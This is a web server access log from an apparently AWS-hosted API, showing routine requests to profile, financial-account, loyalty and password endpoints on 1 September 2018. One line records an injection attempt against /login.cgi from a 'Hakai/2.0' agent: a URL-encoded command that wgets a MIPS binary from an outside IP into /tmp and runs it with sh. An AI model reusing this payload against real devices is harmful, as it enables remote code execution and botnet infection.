ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:35 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:35 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:35 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:35 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:35 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:35 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 433 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:35 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "OPTIONS /signup/status HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "OPTIONS /lists/get/all HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /user_details/user_details HTTP/1.1" 202 310 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /financial/accounts HTTP/1.1" 404 318 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /loyalty/confirm HTTP/1.1" 200 10705 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /property/property_linked HTTP/1.1" 200 1793 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:38 +0000] "OPTIONS /completion/value HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "OPTIONS /surveys/total/points HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /signup/status HTTP/1.1" 200 774 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /lists/get/all HTTP/1.1" 200 6817 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:36 +0000] "GET /financial/accounts HTTP/1.1" 200 25325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "OPTIONS /completion/value HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "POST /completion/value HTTP/1.1" 200 298 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "GET /surveys/total/points HTTP/1.1" 200 325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "POST /completion/value HTTP/1.1" 200 298 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "GET /completion/value HTTP/1.1" 200 376 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "OPTIONS /completion/value HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:22:39 +0000] "GET /completion/value HTTP/1.1" 200 376 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:22:48 +0000] "OPTIONS /signup/change_password HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:22:48 +0000] "PUT /signup/change_password HTTP/1.1" 401 309 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /loyalty/confirm HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 433 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /surveys/total/points HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /signup/status HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /loyalty/confirm HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "OPTIONS /lists/get/all HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "GET /loyalty/confirm HTTP/1.1" 200 10705 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "GET /financial/accounts HTTP/1.1" 404 318 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "GET /financial/accounts HTTP/1.1" 200 25325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "GET /settings/profile HTTP/1.1" 200 2848 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "GET /surveys/total/points HTTP/1.1" 200 325 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "GET /loyalty/confirm HTTP/1.1" 200 7849 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "GET /user_details/user_details HTTP/1.1" 202 310 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "GET /signup/status HTTP/1.1" 200 774 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "GET /lists/get/all HTTP/1.1" 200 6817 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "GET /user_details/user_details HTTP/1.1" 200 854 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:16 +0000] "GET /property/property_linked HTTP/1.1" 200 1793 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:16 +0000] "GET /property/property_linked HTTP/1.1" 200 728 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:17 +0000] "GET /settings/profile HTTP/1.1" 200 11534 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:18 +0000] "OPTIONS /completion/value HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:19 +0000] "OPTIONS /completion/value HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:19 +0000] "POST /completion/value HTTP/1.1" 200 298 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:19 +0000] "POST /completion/value HTTP/1.1" 200 298 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:19 +0000] "GET /completion/value HTTP/1.1" 200 377 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:19 +0000] "OPTIONS /completion/value HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:19 +0000] "GET /completion/value HTTP/1.1" 200 376 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:27 +0000] "OPTIONS /signup/change_password HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:27 +0000] "PUT /signup/change_password HTTP/1.1" 401 309 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:43 +0000] "OPTIONS /signup/change_password HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:23:44 +0000] "PUT /signup/change_password HTTP/1.1" 401 336 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:57 +0000] "OPTIONS /signup/change_password HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:23:57 +0000] "PUT /signup/change_password HTTP/1.1" 201 297 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 106.12.23.237 - - [01/Sep/2018:07:24:58 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://50.115.166.136/hakai.mips%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 0 "-" "Hakai/2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:09 +0000] "OPTIONS /loyalty/confirm HTTP/1.1" 200 424 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:09 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 419 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 433 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 430 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "GET /user_details/user_details HTTP/1.1" 202 310 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "GET /financial/accounts HTTP/1.1" 404 318 "http://localhost:4200/loyalty/success" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /loyalty/confirm HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /property/property_linked HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /surveys/total/points HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /signup/status HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [01/Sep/2018:07:25:10 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
